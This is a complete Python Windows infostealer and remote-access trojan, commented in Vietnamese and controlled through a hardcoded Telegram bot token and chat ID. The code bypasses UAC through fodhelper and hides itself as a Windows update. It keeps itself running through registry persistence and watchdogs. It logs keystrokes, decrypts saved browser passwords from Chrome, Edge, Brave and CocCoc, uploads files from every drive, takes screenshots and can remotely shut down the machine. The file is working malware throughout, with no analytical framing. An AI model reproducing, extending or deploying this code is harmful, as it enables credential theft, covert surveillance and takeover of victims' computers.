import os
import shutil
import json
import base64
import sqlite3
import win32crypt
import time
import pyautogui
import requests
import threading
import keyboard
import subprocess
import sys
import psutil
from Crypto.Cipher import AES
from telebot import TeleBot, types
import winreg
import ctypes

#  Cấu hình Bot Telegram 
BOT_TOKEN = '8628695487:AAEV5oHUUMpGon6mFQnXIC7Z5zytnErMEvk' #'Thay BOT của Ae vào đây'
CHAT_ID = '7153197678'#'ID tele của AE'
bot = TeleBot(BOT_TOKEN)

# Đường dẫn backup
BACKUP_DIR = "C:\\ProgramData\\WindowsUpdate"
BACKUP_FILE = os.path.join(BACKUP_DIR, "system_update.exe")

# Chống kill từ Task Manager
def prevent_kill():
    while True:
        if not psutil.pid_exists(os.getpid()):
            subprocess.Popen([sys.executable, __file__])
            os._exit(0)
        time.sleep(3)

# Tự sao lưu & chống xóa
def auto_backup():
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    current_file = sys.argv[0]
    if not os.path.exists(BACKUP_FILE) or os.path.abspath(current_file) != os.path.abspath(BACKUP_FILE):
        shutil.copy2(current_file, BACKUP_FILE)
        subprocess.Popen([BACKUP_FILE], shell=True)
        sys.exit()

# Watchdog 
def watchdog():
    parent_pid = os.getppid()
    while True:
        if not psutil.pid_exists(parent_pid):
            subprocess.Popen([sys.executable, __file__])
            os._exit(0)
        time.sleep(5)
OUTPUT_DIR = os.path.join(os.environ['TEMP'], 'StealData')
KEYLOG_DIR = os.path.join(OUTPUT_DIR, 'Keylog')

os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(KEYLOG_DIR, exist_ok=True)

keylog_file = os.path.join(KEYLOG_DIR, "keylog.txt")
def bypass_uac():
    payload = sys.argv[0]
    reg_path = r"Software\Classes\ms-settings\shell\open\command"
    
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg_key:
            winreg.SetValueEx(reg_key, "", 0, winreg.REG_SZ, payload)
            winreg.SetValueEx(reg_key, "DelegateExecute", 0, winreg.REG_SZ, "")

        os.system("C:\\Windows\\System32\\fodhelper.exe")
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            winreg.DeleteKey(reg_key, "")
        send_message("✅ UAC Bypass thành công! Đã chạy với quyền Admin.")
    except Exception as e:
        error_msg = f"⚠️ UAC Bypass thất bại: {e}"
        send_message(error_msg)

#  Thêm vào Startup(kết hợp với UAC Bypass) 
def add_to_startup():
    exe_path = os.path.abspath(sys.argv[0])
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    value_name = 'WindowsUpdateMonitor'

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, exe_path)
        bypass_uac()

    except:
        pass
def hide_console():
    try:
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except:
        pass
def kill_old_instance():
    current_pid = os.getpid()
    current_file = os.path.abspath(sys.argv[0])

    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        if proc.info['pid'] == current_pid:
            continue

        exe_path = proc.info['exe']
        if not exe_path or not os.path.exists(exe_path):
            continue

        try:
            if os.path.samefile(exe_path, current_file):
                proc.kill()
        except:
            pass
def send_message(text, parse_mode=None):
    try:
        bot.send_message(CHAT_ID, text, parse_mode=parse_mode)
    except:
        pass

def send_file(file_path, caption=""):
    try:
        with open(file_path, 'rb') as f:
            bot.send_document(CHAT_ID, f, caption=caption)
    except:
        pass

# ===== Keylogger =====
def write_keylog(key):
    with open(keylog_file, 'a', encoding='utf-8') as f:
        f.write(key.name if len(key.name) == 1 else f'[{key.name}]')

def keylogger_thread():
    keyboard.on_press(write_keylog)
    keyboard.wait()

def send_and_clear_keylog():
    if os.path.exists(keylog_file) and os.path.getsize(keylog_file) > 0:
        with open(keylog_file, 'r', encoding='utf-8') as f:
            content = f.read()

        send_message(f"📄 Keylog:\n```\n{content}\n```", parse_mode="Markdown")
        open(keylog_file, 'w').close()

# ===== Lấy mật khẩu trình duyệt =====
BROWSER_PATHS = {
    'Chrome': os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\',
    'Edge': os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\',
    'Brave': os.path.expanduser('~') + '\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\',
    'CocCoc': os.path.expanduser('~') + '\\AppData\\Local\\CocCoc\\Browser\\User Data\\'
}

def get_master_key(browser_path):
    try:
        with open(browser_path + 'Local State', 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        encrypted = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted)[:-16].decode()
    except:
        return "FAILED"

def steal_passwords():
    for browser, path in BROWSER_PATHS.items():
        if not os.path.exists(path):
            continue

        master_key = get_master_key(path)
        if not master_key:
            continue

        for profile in os.listdir(path):
            if "Profile" not in profile and profile != "Default":
                continue

            login_db = os.path.join(path, profile, 'Login Data')
            if not os.path.exists(login_db):
                continue

            shutil.copy2(login_db, 'temp_login.db')
            conn = sqlite3.connect('temp_login.db')
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            result = []
            for url, username, encrypted_password in cursor.fetchall():
                password = decrypt_password(encrypted_password, master_key)
                result.append(f"{url} | {username} | {password}")

            conn.close()
            os.remove('temp_login.db')

            if result:
                file_path = os.path.join(OUTPUT_DIR, f'{browser}_{profile}_passwords.txt')
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(result))
                send_file(file_path, f'🔐 {browser} - {profile}')

def find_chrome_path():
    # Các vị trí phổ biến
    possible_paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe")
    ]

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe") as key:
            chrome_path, _ = winreg.QueryValueEx(key, "")
            if os.path.exists(chrome_path):
                return chrome_path
    except:
        pass
    for path in possible_paths:
        if os.path.exists(path):
            return path
    return None
def find_and_send_files():
    file_types = ['.txt', '.docx', '.pdf', '.jpg', '.png']
    found_files = []
    drives = [f"{d}:/" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:/")]

    for drive in drives:
        for root, _, files in os.walk(drive):
            for file in files:
                if os.path.splitext(file)[1].lower() in file_types:
                    file_path = os.path.join(root, file)
                    found_files.append(file_path)
                    send_file(file_path)
                    if len(found_files) >= 10:
                        send_message("📂 Đã gửi 10 file quan trọng. Đang tiếp tục...")
                        return

    if not found_files:
        send_message("⚠️ Không tìm thấy file quan trọng nào!")

@bot.message_handler(commands=['lay_file'])
def cmd_list_files(message):
    send_message("🔍 Đang tìm file quan trọng...")
    find_and_send_files()
    send_message("✅ Hoàn thành!")

@bot.message_handler(commands=['shutdown'])
def cmd_shutdown(message):
    send_message("🛑 Đang tắt máy...")
    os.system("shutdown /s /t 0")

@bot.message_handler(commands=['restart'])
def cmd_restart(message):
    send_message("🔄 Đang khởi động lại máy...")
    os.system("shutdown /r /t 0")


@bot.message_handler(commands=['help'])
def cmd_help(message):
    send_message("""
📖 Danh sách lệnh:
/lay_pass - Lấy mật khẩu trình duyệt
/lay_keylog - Xem keylog
/chup_man_hinh - Chụp màn hình
/mo_url - Mở URL
/lay_file - Lấy danh sách file quan trọng 
/shutdown - Tắt máy
/restart - Khởi động lại máy                             
    """)


@bot.message_handler(commands=['lay_pass'])
def cmd_passwords(message):
    steal_passwords()

@bot.message_handler(commands=['lay_keylog'])
def cmd_keylog(message):
    send_and_clear_keylog()

@bot.message_handler(commands=['chup_man_hinh'])
def cmd_screenshot(message):
    file_path = os.path.join(OUTPUT_DIR, 'screenshot.png')
    pyautogui.screenshot().save(file_path)
    send_file(file_path, "🖼 Screenshot")

@bot.message_handler(commands=['mo_url'])
def cmd_open_url(message):
    url = message.text.split(maxsplit=1)[-1]
    if not url.startswith('http'):
        url = 'http://' + url

    chrome_path = find_chrome_path()
    if chrome_path:
        subprocess.Popen([chrome_path, '--new-tab', url], shell=False)
        send_message(f"🌐 Đã mở: {url}")
    else:
        send_message("⚠️ Không tìm thấy Chrome trên máy!")
if __name__ == '__main__':
    kill_old_instance()
    add_to_startup()
    hide_console()
    threading.Thread(target=watchdog, daemon=True).start()
    threading.Thread(target=keylogger_thread, daemon=True).start()
    send_message("✅ Bot đã khởi động Nhấn /help !")
    bot.polling(none_stop=True)
